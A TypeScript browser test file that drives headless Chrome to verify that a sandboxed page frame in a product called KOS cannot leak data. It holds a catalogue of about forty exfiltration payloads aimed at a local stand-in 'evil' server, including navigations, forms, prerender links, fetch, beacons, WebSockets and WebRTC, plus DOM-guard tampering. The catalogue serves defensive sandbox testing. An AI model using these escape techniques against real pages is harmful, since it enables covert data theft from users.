import { spawn, type ChildProcess } from "node:child_process";
import { createSocket, type Socket } from "node:dgram";
import { existsSync, mkdtempSync, rmSync } from "node:fs";
import { createServer, type Server } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import { GUARD_SCRIPT, pageDocument, wrapperDocument } from "@kos/shared";
import { DONE_MS, REVEAL_MS, ownerIn, revealAllowed, saveAllowed } from "./frameheight.js";

/**
 * Every way out of a page's frame, tried in a real Chrome. Each attempt aims
 * at a server standing in for an attacker; the test holds that it is sent no
 * request at all, and that the page was really running when it tried. A
 * control runs the flat frame KOS had before, which does leak, so the test is
 * known to see a leak when there is one. Skipped without Chrome.
 *
 * What it does not hold: a navigation attempt still makes Chrome open a
 * connection (DNS and TCP, no request) to the host it names, before the
 * policy refuses it (artifactdoc.ts). It counts requests, not connections.
 */

const CHROME = ["/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", "/usr/bin/google-chrome", "/usr/bin/google-chrome-stable", "/usr/bin/chromium"].find((p) => existsSync(p));

/** The attempts, each a script the page runs once it is up; `E` is the attacker. */
function attempts(E: string): Record<string, string> {
  const link = (how: string): string => how;
  return {
    href: `location.href = "${E}/href?d=1"`,
    assign: `location.assign("${E}/assign?d=1")`,
    replace: `location.replace("${E}/replace?d=1")`,
    open: `window.open("${E}/open?d=1")`,
    form: `const f = document.createElement("form"); f.method = "post"; f.action = "${E}/form"; document.body.append(f); f.submit()`,
    formMarkup: `document.body.innerHTML = '<form action="${E}/formmarkup"></form>'; document.forms[0].submit()`,
    metaRefresh: `const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=${E}/meta"; document.head.append(m)`,
    metaMarkup: `document.head.insertAdjacentHTML("beforeend", '<meta http-equiv="refresh" content="0;url=${E}/metamarkup">')`,
    anchor: `const a = document.createElement("a"); a.href = "${E}/aself?d=1"; document.body.append(a); a.click()`,
    anchorBlank: `const a = document.createElement("a"); a.href = "${E}/ablank"; a.target = "_blank"; document.body.append(a); a.click()`,
    anchorTop: `const a = document.createElement("a"); a.href = "${E}/atop"; a.target = "_top"; document.body.append(a); a.click()`,
    download: `const a = document.createElement("a"); a.href = "${E}/download"; a.download = "x"; document.body.append(a); a.click()`,
    top: `top.location = "${E}/top"`,
    parent: `parent.location = "${E}/parent"`,
    history: `try { history.pushState({}, "", "${E}/push"); } catch (e) {} location.reload()`,
    iframeHash: `const f = document.createElement("iframe"); f.src = "${E}/frame#d=1"; document.body.append(f)`,
    iframeMarkup: `document.body.innerHTML = '<iframe src="${E}/framemarkup#d=1"></iframe>'`,
    dataNav: `location.href = "data:text/html,<script>fetch('${E}/datanav')<\\/script>"`,
    blobNav: `location.href = URL.createObjectURL(new Blob(["<script>fetch('${E}/blobnav')<\\/script>"], { type: "text/html" }))`,
    prerender: link(`const l = document.createElement("link"); l.rel = "prerender"; l.href = "${E}/prerender"; document.head.append(l)`),
    prerenderMarkup: link(`document.body.insertAdjacentHTML("beforeend", '<link rel="pre' + 'render" href="${E}/prerendermarkup">')`),
    prerenderWrite: link(`document.write('<link rel="prerender" href="${E}/prerenderwrite">')`),
    prerenderParser: link(`const d = new DOMParser().parseFromString('<link rel="prerender" href="${E}/prerenderparser">', "text/html"); document.head.append(document.adoptNode(d.querySelector("link")))`),
    prerenderNS: link(`const l = document.createElementNS("http://www.w3.org/1999/xhtml", "link"); l.rel = "prerender"; l.href = "${E}/prerenderns"; document.head.append(l)`),
    prerenderRange: link(`document.head.append(document.createRange().createContextualFragment('<link rel="prerender" href="${E}/prerenderrange">'))`),
    prerenderShadow: link(`const h = document.createElement("div"); document.body.append(h); h.attachShadow({ mode: "open" }).innerHTML = '<link rel="prerender" href="${E}/prerendershadow">'`),
    prerenderTemplate: link(`const t = document.createElement("template"); t.innerHTML = '<link rel="prerender" href="${E}/prerendertemplate">'; document.head.append(t.content.cloneNode(true))`),
    prerenderRealm: link(`const f = document.createElement("iframe"); document.body.append(f); const l = f.contentDocument.createElement("link"); l.rel = "prerender"; l.href = "${E}/prerenderrealm"; document.head.append(l)`),
    prefetchHints: link(`for (const rel of ["prefetch", "preload", "preconnect", "dns-prefetch", "modulepreload"]) { const l = document.createElement("link"); l.rel = rel; l.as = "fetch"; l.href = "${E}/" + rel; document.head.append(l); }`),
    speculation: `const s = document.createElement("script"); s.type = "speculationrules"; s.text = JSON.stringify({ prefetch: [{ source: "list", urls: ["${E}/speculation"] }] }); document.head.append(s)`,
    fetch: `fetch("${E}/fetch").catch(() => {})`,
    beacon: `navigator.sendBeacon("${E}/beacon", "d")`,
    socket: `try { new WebSocket("${E.replace("http", "ws")}/ws"); } catch (e) {} try { new EventSource("${E}/sse"); } catch (e) {}`,
    worker: `try { new Worker(URL.createObjectURL(new Blob(["fetch('${E}/worker')"], { type: "text/javascript" }))); } catch (e) {}`,
    css: `const s = document.createElement("style"); s.textContent = "body{background:url(${E}/css)} @font-face{font-family:x;src:url(${E}/font)}"; document.head.append(s)`,
    image: `new Image().src = "${E}/image"; document.body.insertAdjacentHTML("beforeend", '<svg><image href="${E}/svgimage"/></svg>')`,
    object: `document.body.insertAdjacentHTML("beforeend", '<object data="${E}/object"></object>')`,
    // A link made by a document's own parser, never by a factory the guard holds.
    prerenderCreateDocument: link(`const d = document.implementation.createDocument(XHTML, "link", null); const l = d.documentElement; l.setAttribute("rel", "prerender"); l.setAttribute("href", "${E}/createdocument"); document.head.append(document.adoptNode(l))`),
    prerenderXhtml: link(`const d = new DOMParser().parseFromString('<x:link xmlns:x="' + XHTML + '" rel="prerender" href="${E}/xhtml"/>', "application/xhtml+xml"); document.head.appendChild(d.documentElement)`),
    prerenderEntity: link(`const d = new DOMParser().parseFromString('<!DOCTYPE r [<!ENTITY e "&#60;link xmlns=&#34;' + XHTML + '&#34; rel=&#34;prerender&#34; href=&#34;${E}/entity&#34;/&#62;">]><r>&e;</r>', "application/xml"); document.head.append(...d.documentElement.childNodes)`),
    prerenderSvg: link(`const d = new DOMParser().parseFromString('<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><link xmlns="' + XHTML + '" rel="prerender" href="${E}/svg"/></foreignObject></svg>', "image/svg+xml"); document.body.append(document.importNode(d.documentElement, true))`),
    // The page takes back what the guard calls through, then tries again.
    prerenderTampered: link(`Function.prototype.call = Function.prototype.apply = function () { return null }; RegExp.prototype.exec = RegExp.prototype.test = () => null; Object.defineProperty(Node, Symbol.hasInstance, { value: () => false }); const l = document.createElement("link"); l.rel = "prerender"; l.href = "${E}/tampered"; document.head.append(l)`),
    metaClone: `const m = document.querySelector("meta").cloneNode(); m.removeAttribute("charset"); m.httpEquiv = "refresh"; m.content = "0;url=${E}/metaclone"; document.head.append(m)`,
  };
}

const XHTML = "http://www.w3.org/1999/xhtml";

/**
 * Every way this test knows to make an element, crossed with every way to put
 * a node into a document. A page runs the lot, each in its own try, then
 * counts the elements no policy governs that ended up in its document: the
 * guard should leave none, whatever made them and whatever placed them.
 */
const FORBIDDEN = ["link", "meta", "iframe", "form", "base", "object", "embed", "script", "frame"];
const SWEEP = String.raw`
const makers = {
  createElement: (t) => document.createElement(t),
  createElementNS: (t) => document.createElementNS(XHTML, t),
  createElementNSPrefixed: (t) => document.createElementNS(XHTML, "x:" + t),
  createElementNSOther: (t) => document.createElementNS("urn:x", t),
  createDocument: (t) => document.implementation.createDocument(XHTML, t, null).documentElement,
  createHTMLDocument: (t) => document.implementation.createHTMLDocument("").createElement(t),
  domParserHtml: (t) => new DOMParser().parseFromString("<" + t + ">", "text/html").querySelector(t),
  domParserXhtml: (t) => new DOMParser().parseFromString("<x:" + t + ' xmlns:x="' + XHTML + '"/>', "application/xhtml+xml").documentElement,
  domParserEntity: (t) => new DOMParser().parseFromString('<!DOCTYPE r [<!ENTITY e "&#60;' + t + ' xmlns=&#34;' + XHTML + '&#34;/&#62;">]><r>&e;</r>', "application/xml").documentElement.firstChild,
  domParserSvg: (t) => new DOMParser().parseFromString('<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><' + t + ' xmlns="' + XHTML + '"/></foreignObject></svg>', "image/svg+xml").documentElement,
  innerHTML: (t) => { const d = document.createElement("div"); d.innerHTML = "<" + t + ">"; return d; },
  template: (t) => { const x = document.createElement("template"); x.innerHTML = "<" + t + ">"; return x.content; },
  range: (t) => document.createRange().createContextualFragment("<" + t + ">"),
  setHTMLUnsafe: (t) => { const d = document.createElement("div"); d.setHTMLUnsafe("<" + t + ">"); return d; },
  parseHTMLUnsafe: (t) => Document.parseHTMLUnsafe("<" + t + ">").querySelector(t),
  clone: (t) => { const n = document.querySelector(t); return n && n.cloneNode(true); },
};
const placers = {
  appendChild: (n) => document.body.appendChild(n),
  insertBefore: (n) => document.body.insertBefore(n, document.body.firstChild),
  replaceChild: (n) => { const s = document.createElement("span"); document.body.append(s); document.body.replaceChild(n, s); },
  append: (n) => document.body.append(n),
  prepend: (n) => document.head.prepend(n),
  replaceChildren: (n) => { const s = document.createElement("div"); document.body.append(s); s.replaceChildren(n); },
  replaceWith: (n) => { const s = document.createElement("span"); document.body.append(s); s.replaceWith(n); },
  before: (n) => document.body.firstChild.before(n),
  after: (n) => document.body.firstChild.after(n),
  textBefore: (n) => { const s = document.createTextNode(""); document.body.append(s); s.before(n); },
  insertAdjacentElement: (n) => document.body.insertAdjacentElement("beforeend", n),
  rangeInsert: (n) => { const r = document.createRange(); r.selectNodeContents(document.body); r.insertNode(n); },
  rangeSurround: (n) => { const r = document.createRange(); r.selectNodeContents(document.body.lastChild || document.body); r.surroundContents(n); },
  adopt: (n) => document.body.append(document.adoptNode(n)),
  import: (n) => document.body.append(document.importNode(n, true)),
  shadow: (n) => { const h = document.createElement("div"); document.body.append(h); h.attachShadow({ mode: "open" }).append(n); },
};
const before = {};
for (const t of TAGS) before[t] = document.getElementsByTagNameNS("*", t).length + document.getElementsByTagNameNS("*", "x:" + t).length;
let tried = 0, made = 0;
for (const t of TAGS) for (const make of Object.values(makers)) for (const place of Object.values(placers)) {
  tried++;
  let n; try { n = make(t); } catch (e) { continue; }
  if (!n) continue;
  made++;
  try { place(n); } catch (e) {}
}
const shadows = [...document.querySelectorAll("div")].map((d) => d.shadowRoot).filter(Boolean);
const placed = {};
for (const t of TAGS) {
  let k = document.getElementsByTagNameNS("*", t).length + document.getElementsByTagNameNS("*", "x:" + t).length - before[t];
  for (const r of shadows) k += r.querySelectorAll(t).length;
  if (k) placed[t] = k;
}
top.postMessage({ census: { tried, made, placed } }, "*");
`;

/** A page that says it is up, then tries one way out. */
const attempt = (code: string): string => `<p>page</p><script>top.postMessage("alive", "*"); setTimeout(() => { try { ${code} } catch (e) {} }, 50)</script>`;

interface Run {
  alive: boolean;
  requests: string[];
  /** What the page told the dashboard, when it says more than that it is up. */
  said?: string;
}

describe.skipIf(!CHROME)("a page's frame in a real Chrome", () => {
  let evil: Server;
  let host: Server;
  let chrome: ChildProcess;
  let profile = "";
  let E = "";
  let base = "";
  const requests: string[] = [];
  const pages = new Map<string, string>();
  let send: (method: string, params?: Record<string, unknown>) => Promise<Record<string, unknown>>;
  let close = (): void => undefined;

  const listen = (server: Server): Promise<number> =>
    new Promise((resolve) => server.listen(0, "127.0.0.1", () => resolve((server.address() as { port: number }).port)));

  beforeAll(async () => {
    evil = createServer((req, res) => {
      requests.push(req.url ?? "");
      res.writeHead(200, { "content-type": "text/html", "access-control-allow-origin": "*" }).end("<p>evil</p>");
    });
    E = `http://127.0.0.1:${await listen(evil)}`;
    host = createServer((req, res) => res.writeHead(200, { "content-type": "text/html" }).end(pages.get(req.url ?? "") ?? ""));
    base = `http://127.0.0.1:${await listen(host)}`;
    profile = mkdtempSync(join(tmpdir(), "kos-artifact-chrome-"));
    const port = 9400 + Math.floor(Math.random() * 400);
    chrome = spawn(CHROME!, ["--headless=new", `--remote-debugging-port=${port}`, `--user-data-dir=${profile}`, "--no-first-run", "about:blank"], { stdio: "ignore" });
    let version: { webSocketDebuggerUrl: string } | undefined;
    for (let i = 0; i < 300 && !version; i++) {
      version = await fetch(`http://127.0.0.1:${port}/json/version`).then((r) => r.json() as Promise<{ webSocketDebuggerUrl: string }>).catch(() => undefined);
      if (!version) await new Promise((r) => setTimeout(r, 100));
    }
    const ws = new WebSocket(version!.webSocketDebuggerUrl);
    await new Promise((r) => (ws.onopen = r));
    let n = 0;
    const wait = new Map<number, (m: { result?: Record<string, unknown> }) => void>();
    ws.onmessage = (e) => {
      const m = JSON.parse(String(e.data)) as { id?: number; result?: Record<string, unknown> };
      if (m.id) wait.get(m.id)?.(m);
    };
    const raw = (method: string, params: Record<string, unknown> = {}, sessionId?: string): Promise<Record<string, unknown>> =>
      new Promise((resolve) => {
        const id = ++n;
        wait.set(id, (m) => resolve(m.result ?? {}));
        ws.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
      });
    const target = await raw("Target.createTarget", { url: "about:blank" });
    const session = (await raw("Target.attachToTarget", { targetId: target.targetId, flatten: true })).sessionId as string;
    send = (method, params = {}) => raw(method, params, session);
    close = () => ws.close();
  }, 30_000);

  afterAll(async () => {
    close();
    // Chrome writes its profile as it goes; the folder goes once it has exited.
    if (chrome && chrome.exitCode === null) await new Promise((r) => (chrome.once("exit", r), chrome.kill()));
    evil?.close();
    host?.close();
    // Chrome's helpers can still be writing the profile after the browser exits; a temp
    // folder left behind must not fail the run, so the delete retries and then lets go.
    if (profile) {
      try {
        rmSync(profile, { recursive: true, force: true, maxRetries: 10, retryDelay: 200 });
      } catch {
        // The OS clears tmp; the test's verdict stands.
      }
    }
  });

  /** The dashboard's side: the frame as ArtifactPage draws it, around one page. */
  async function run(name: string, frame: string): Promise<Run> {
    const path = `/${name}`;
    pages.set(path, `<!doctype html><body><script>addEventListener("message", (e) => { if (e.data === "alive") document.title = "alive"; else if (e.data && e.data.census) document.body.dataset.said = JSON.stringify(e.data.census); })</script><iframe sandbox="allow-scripts" srcdoc="${frame.replace(/&/g, "&amp;").replace(/"/g, "&quot;")}"></iframe></body>`);
    requests.length = 0;
    await send("Page.navigate", { url: `${base}${path}` });
    await new Promise((r) => setTimeout(r, 1300));
    const read = async (expression: string): Promise<string | undefined> =>
      ((await send("Runtime.evaluate", { expression, returnByValue: true })).result as { value?: string } | undefined)?.value;
    // A census is slow on a busy machine: wait for it, up to a bound, rather than guess how long it takes.
    const counting = frame.includes("const TAGS =");
    for (let waited = 0; counting && !(await read("document.body.dataset.said || ''")) && waited < 10_000; waited += 200) {
      await new Promise((r) => setTimeout(r, 200));
    }
    const title = await read("document.title");
    const said = await read("document.body.dataset.said || ''");
    return { alive: title === "alive", requests: [...requests], ...(said ? { said } : {}) };
  }

  const page = (code: string): string => pageDocument({ html: attempt(`const XHTML = "${XHTML}"; ${code}`), tokens: {}, mode: "dark", css: "", libraries: [] });
  /** The same page with the guard taken out, for the controls. */
  const unguarded = (code: string): string => page(code).replace(`<script>${GUARD_SCRIPT}</script>`, "").replace("; require-trusted-types-for 'script'; trusted-types default", "");

  it("sees a leak when there is one: the flat frame KOS had sends a navigation's request", async () => {
    const flat = await run("control", page(attempts(E).href!).replace(/<meta http-equiv="Content-Security-Policy"[^>]*>/, `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'">`));
    expect(flat.alive).toBe(true);
    expect(flat.requests.join(" ")).toContain("/href");
  }, 20_000);

  it("sees a placed element when there is one: the sweep without the guard places every kind", async () => {
    const bare = await run("sweep-control", wrapperDocument(unguarded(`const TAGS = ${JSON.stringify(FORBIDDEN)}; ${SWEEP}`)));
    expect(bare.alive).toBe(true);
    const census = JSON.parse(bare.said ?? "{}") as { placed?: Record<string, number> };
    expect(Object.keys(census.placed ?? {}).sort()).toEqual([...FORBIDDEN].sort());
  }, 20_000);

  it("places none of them, made and placed every way there is", async () => {
    const swept = await run("sweep", wrapperDocument(page(`const TAGS = ${JSON.stringify(FORBIDDEN)}; ${SWEEP}`)));
    expect(swept.alive).toBe(true);
    const census = JSON.parse(swept.said ?? "{}") as { tried: number; made: number; placed: Record<string, number> };
    // Some routes do still make one (a parser, a clone of the page's own <meta>); none may place it.
    expect(census.tried).toBe(FORBIDDEN.length * 16 * 16);
    expect(census.made).toBeGreaterThan(0);
    expect(census.placed).toEqual({});
    expect(swept.requests).toEqual([]);
  }, 20_000);

  /*
   * WebRTC reaches the network beside every policy: ICE sends STUN over UDP
   * to whatever server the page names. A listener stands in for one.
   */
  describe("WebRTC", () => {
    const sockets: Socket[] = [];
    /** A STUN server of its own for each run, so a straggler from one is never counted in another. */
    async function stunServer(): Promise<{ url: string; packets: number[] }> {
      const udp = createSocket("udp4");
      sockets.push(udp);
      const packets: number[] = [];
      udp.on("message", (m) => packets.push(m.length));
      await new Promise<void>((r) => udp.bind(0, "127.0.0.1", r));
      return { url: `stun:127.0.0.1:${udp.address().port}`, packets };
    }
    afterAll(() => sockets.forEach((u) => u.close()));
    const offer = (stun: string): string => `const pc = new RTCPeerConnection({ iceServers: [{ urls: "${stun}" }] }); pc.createDataChannel("d"); pc.createOffer().then((o) => pc.setLocalDescription(o))`;

    it("sees the packets when WebRTC is there", async () => {
      const stun = await stunServer();
      const bare = await run("rtc-control", wrapperDocument(unguarded(offer(stun.url))));
      expect(bare.alive).toBe(true);
      expect(stun.packets.length).toBeGreaterThan(0);
    }, 20_000);

    it("sends none from a page", async () => {
      const stun = await stunServer();
      const guarded = await run("rtc", wrapperDocument(page(`${offer(stun.url)}; try { new webkitRTCPeerConnection({}) } catch (e) {}`)));
      expect(guarded.alive).toBe(true);
      expect(stun.packets).toEqual([]);
    }, 20_000);
  });

  /*
   * The bridge's side of a page as tall as its content, against a stand-in
   * for the dashboard that applies each report as it comes (the dashboard's
   * own hold on the height, heightGate, is tested in ArtifactPage.test): the
   * report is the content's height, the page then has no scrollbar of its
   * own, and a link to a place on it, pressed by a real pointer, reports
   * where the place is.
   */
  it("reports a page's content height, which leaves no scroll inside once applied, and a #link reports its place", async () => {
    const html = `<style>body{margin:0}</style><a id="go" href="#end" style="display:block;height:40px">jump</a><div style="height:2600px"></div><h2 id="end" style="margin:0;height:60px">end</h2><script>
      addEventListener("message", (e) => { if (e.data === "probe") top.postMessage({ probe: { scroll: document.scrollingElement.scrollHeight, client: document.scrollingElement.clientHeight, wide: document.scrollingElement.scrollWidth > innerWidth, view: innerHeight } }, "*"); });
    </script>`;
    const frame = wrapperDocument(pageDocument({ html, tokens: {}, mode: "dark", css: "", libraries: [], kind: "page" }));
    pages.set("/fit", `<!doctype html><body style="margin:0"><iframe id="f" sandbox="allow-scripts" style="display:block;border:0;width:600px;height:300px" srcdoc="${frame.replace(/&/g, "&amp;").replace(/"/g, "&quot;")}"></iframe><div style="height:2000px"></div><script>
      const f = document.getElementById("f");
      addEventListener("message", (e) => {
        const page = f.contentWindow.frames[0], m = e.data || {};
        if (e.source !== page) return;
        if (m.__kos === "height") {
          f.style.height = Math.min(m.height, 50000) + "px";
          document.body.dataset.heights = String(Number(document.body.dataset.heights || 0) + 1);
          if (m.reveal && navigator.userActivation.isActive) scrollTo({ top: f.getBoundingClientRect().top + scrollY + m.reveal.top });
        }
        if (m.probe) document.body.dataset.probe = JSON.stringify(m.probe);
      });
    </script></body>`);
    await send("Emulation.setDeviceMetricsOverride", { width: 800, height: 600, deviceScaleFactor: 1, mobile: false });
    await send("Page.navigate", { url: `${base}/fit` });
    await new Promise((r) => setTimeout(r, 1200));
    const value = async (expression: string): Promise<unknown> => ((await send("Runtime.evaluate", { expression, returnByValue: true })).result as { value?: unknown } | undefined)?.value;
    await value(`document.getElementById("f").contentWindow.frames[0].postMessage("probe", "*")`);
    await new Promise((r) => setTimeout(r, 300));
    const probe = JSON.parse(String(await value("document.body.dataset.probe || '{}'"))) as { scroll?: number; client?: number; wide?: boolean };
    expect(await value(`document.getElementById("f").getBoundingClientRect().height`)).toBe(2700);
    // No scroll inside: the page's document is exactly as tall as its frame.
    expect(probe.scroll).toBe(probe.client);
    expect(probe.client).toBe(2700);
    expect(probe.wide).toBe(false);
    // It settles: a report or two, not a loop.
    expect(Number(await value("document.body.dataset.heights"))).toBeLessThanOrEqual(3);
    expect(await value("scrollY")).toBe(0);
    for (const type of ["mousePressed", "mouseReleased"]) await send("Input.dispatchMouseEvent", { type, x: 20, y: 20, button: "left", clickCount: 1 });
    await new Promise((r) => setTimeout(r, 400));
    expect(await value("scrollY")).toBe(2640);
    await send("Emulation.clearDeviceMetricsOverride");
  }, 20_000);

  /*
   * The doc editor, on the doc's runtime as the dashboard inlines it, typed
   * into by a real keyboard: markdown at a line's start, bold around words,
   * a block from the "/" menu, then a save of its own through kos.save once
   * the typing stops, which the bridge sends only at the owner's hand.
   */
  it("edits a doc in place, markdown and the slash menu, and saves on its own through the bridge", async () => {
    const { build } = await import("esbuild");
    const bundled = await build({ entryPoints: [join(import.meta.dirname, "../../pagelib/doc.ts")], bundle: true, write: false, format: "iife", target: "chrome120", charset: "ascii", logLevel: "silent" });
    const runtime = bundled.outputFiles[0]!.text;
    const html = `<article data-doc><p><br></p><h2>Next</h2></article>`;
    const frame = wrapperDocument(pageDocument({ html, tokens: {}, mode: "dark", css: "", libraries: [runtime], kind: "doc" }));
    // The dashboard's own checks, as ArtifactPage makes them (frameheight.ts), run here in the browser.
    const checks = `const REVEAL_MS = ${REVEAL_MS}, DONE_MS = ${DONE_MS}; const ownerIn = ${ownerIn.toString()}; const saveAllowed = ${saveAllowed.toString()}; const revealAllowed = ${revealAllowed.toString()};`;
    pages.set("/doc", `<!doctype html><body style="margin:0"><button id="elsewhere">elsewhere</button><iframe id="f" sandbox="allow-scripts" style="display:block;border:0;width:800px;height:560px" srcdoc="${frame.replace(/&/g, "&amp;").replace(/"/g, "&quot;")}"></iframe><script>
      ${checks}
      const f = document.getElementById("f");
      let gestureAt = -Infinity, ports = 0;
      addEventListener("message", (e) => {
        const page = f.contentWindow.frames[0], m = e.data || {};
        if (e.source !== page) return;
        // The bridge's channel for the owner's presses and keys, taken once as ArtifactPage takes it.
        if (m.__kos === "gestures") { ports += 1; document.body.dataset.ports = String(ports); if (ports === 1) e.ports[0].onmessage = () => { gestureAt = performance.now(); document.body.dataset.gestures = String(Number(document.body.dataset.gestures || 0) + 1); }; return; }
        // The dashboard's edit bar: Edit once the doc says it can be edited.
        if (m.__kos === "edit" && !m.editing && !document.body.dataset.asked) { document.body.dataset.asked = "1"; page.postMessage({ __kos: "edit-do", action: "edit" }, "*"); }
        if (m.__kos !== "call" || m.method !== "save") return;
        // What the dashboard checks before it relays a save: the owner's hand in this frame, as the browser reports it here.
        document.body.dataset.active = String(saveAllowed(f, undefined));
        document.body.dataset.reveal = String(revealAllowed(f, gestureAt));
        document.body.dataset.saves = String(Number(document.body.dataset.saves || 0) + 1);
        document.body.dataset.saved = m.args.edit.doc;
        page.postMessage({ __kos: "reply", id: m.id, result: {} }, "*");
      });
    </script></body>`);
    await send("Emulation.setDeviceMetricsOverride", { width: 800, height: 600, deviceScaleFactor: 1, mobile: false });
    await send("Page.navigate", { url: `${base}/doc` });
    await new Promise((r) => setTimeout(r, 1200));
    const value = async (expression: string): Promise<unknown> => ((await send("Runtime.evaluate", { expression, returnByValue: true, userGesture: false })).result as { value?: unknown } | undefined)?.value;
    // Before the owner touches it, nothing is theirs: no hand in the frame, no press over the channel, which came once.
    expect(await value("ownerIn(f)")).toBe(false);
    expect(await value("document.body.dataset.ports")).toBe("1");
    expect(await value("document.body.dataset.gestures || '0'")).toBe("0");
    const key = async (k: string): Promise<void> => {
      const enter = k === "Enter";
      await send("Input.dispatchKeyEvent", { type: "keyDown", key: k, text: enter ? "\r" : k, ...(enter ? { code: "Enter", windowsVirtualKeyCode: 13 } : {}) });
      await send("Input.dispatchKeyEvent", { type: "keyUp", key: k, ...(enter ? { code: "Enter", windowsVirtualKeyCode: 13 } : {}) });
    };
    const type = async (text: string): Promise<void> => {
      for (const k of text) await key(k);
    };
    // Into the first line, as the owner would (below the dashboard's own button).
    for (const t of ["mousePressed", "mouseReleased"]) await send("Input.dispatchMouseEvent", { type: t, x: 200, y: 70, button: "left", clickCount: 1 });
    await new Promise((r) => setTimeout(r, 200));
    // The press is the owner's hand in the frame, and the frame's channel told the dashboard of it, just now.
    expect(await value("ownerIn(f)")).toBe(true);
    expect(Number(await value("document.body.dataset.gestures"))).toBeGreaterThan(0);
    expect(await value("revealAllowed(f, gestureAt)")).toBe(true);
    await type("## Water");
    await key("Enter");
    await type("it is **wet** now");
    await key("Enter");
    await type("/div");
    await new Promise((r) => setTimeout(r, 100));
    await key("Enter");
    await new Promise((r) => setTimeout(r, 2000));
    const saved = String(await value("document.body.dataset.saved || ''"));
    expect(saved).toContain("<h2>Water</h2>");
    expect(saved).toMatch(/<p>it is(&nbsp;| )<strong>wet<\/strong>(&nbsp;| )now<\/p><hr><h2>Next<\/h2>/);
    expect(saved).toContain("<hr>");
    expect(saved).not.toContain("/div");
    expect(saved).not.toContain("contenteditable");
    // One save for the run of typing, not one a key; and the owner's hand was still counted when it went, here and in the frame (whose bridge refuses one without it).
    expect(Number(await value("document.body.dataset.saves"))).toBe(1);
    expect(await value("document.body.dataset.active")).toBe("true");
    // Two seconds on, the press is too long ago for a jump to scroll the dashboard.
    expect(await value("revealAllowed(f, gestureAt)")).toBe(false);
    // A press on the dashboard itself takes the hand out of the frame.
    for (const t of ["mousePressed", "mouseReleased"]) await send("Input.dispatchMouseEvent", { type: t, x: 20, y: 8, button: "left", clickCount: 1 });
    await new Promise((r) => setTimeout(r, 100));
    expect(await value("ownerIn(f)")).toBe(false);
    expect(await value("saveAllowed(f, undefined)")).toBe(false);
    await send("Emulation.clearDeviceMetricsOverride");
  }, 30_000);

  it("lets no way out send a single request, with the page running each time", async () => {
    const results: Record<string, Run> = {};
    for (const [name, code] of Object.entries(attempts(E))) results[name] = await run(name, wrapperDocument(page(code)));
    const notRunning = Object.entries(results).filter(([, r]) => !r.alive).map(([name]) => name);
    const leaked = Object.fromEntries(Object.entries(results).filter(([, r]) => r.requests.length > 0).map(([name, r]) => [name, r.requests]));
    expect(notRunning).toEqual([]);
    expect(leaked).toEqual({});
  }, 180_000);
});
